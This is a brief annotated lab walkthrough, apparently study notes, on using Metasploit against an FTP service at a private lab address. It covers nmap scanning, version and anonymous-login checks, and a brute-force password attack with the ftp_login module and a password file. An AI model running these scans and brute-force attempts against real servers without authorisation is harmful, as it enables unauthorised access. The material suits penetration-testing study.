# Metasploit-FTP


msfconsole

nmap -p 21 192.168.78.165 //ftp

search ftp_version 检索ftp服务相关漏洞

use auxiliary/scanner/ftp/ftp_version 使用检索到的ftp相关漏洞利用模块

show options

set rhosts 192.168.78.165

run



---



back 退出当前漏洞利用模块返回上一层，如下图所示。

search /ftp/an 查看ftp相关漏洞，如下图所示进行模糊查询。

use auxiliary/scanner/ftp/anonymous

show options

set rhosts 192.168.78.165

run


---
##暴力破解

获取到FTP Banner ：Microsoft FTP Service\x0d\x0a

search ftp_login 检索Metasploit（msf）框架对于ftp_login的漏洞模块，


use auxiliary/scanner/ftp/ftp_login

show options

RHOSTS:受害者主机IP

THREADS：线程数

USERNAME:FTP用户名

PASS_FILE:密码文件

set rhosts 192.168.78.165

set username test1

set pass_file /root/pass.txt

set threads 5

show options

run

ftp IP(ftp 192.168.78.165)
